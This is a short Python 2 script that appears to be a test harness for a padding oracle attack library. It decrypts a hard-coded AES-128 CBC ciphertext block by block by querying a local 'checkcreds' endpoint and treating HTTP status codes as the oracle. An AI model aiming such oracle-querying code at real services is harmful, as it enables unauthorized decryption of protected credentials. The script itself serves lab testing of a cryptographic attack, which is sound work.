#!/usr/bin/python

import urllib
import logging
import sys

from oracle import PaddingAttack

import Colorer

sample_encrypted = "401103ab592440fbc1f6b5e9c65a8d0c36686e296e0541830fae55351d160c38a36589c41b6e0d40a71853a930be2364c85e2e1999ac3878270895228c60e8ac"

def try_sending(enc_block):
    base_url = "http://localhost:7171/checkcreds?enc="
    base_url += enc_block.encode("hex")
    response = urllib.urlopen(base_url)
    return_code = response.getcode()
    if return_code in [200, 404, 500]:
        return return_code
    raise Exception("Yikes!")


def main():
    if sys.argv[-1] == "-d":
        logging.basicConfig(level=logging.DEBUG)
    else:
        print "For DEBUG info pass in the '-d' flag at the command line."
        logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger("test_oracle_aes_128")

    p = PaddingAttack(sample_encrypted[0:32].decode("hex"), "LOLOLOLOLOLOLOLO", try_sending, 16)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[32:64].decode("hex"), sample_encrypted[0:32].decode("hex"), try_sending, 16)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[64:96].decode("hex"), sample_encrypted[32:64].decode("hex"), try_sending, 16)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[96:128].decode("hex"), sample_encrypted[64:96].decode("hex"), try_sending, 16)
    logger.info(p.attack())

if __name__ == '__main__':
    main()

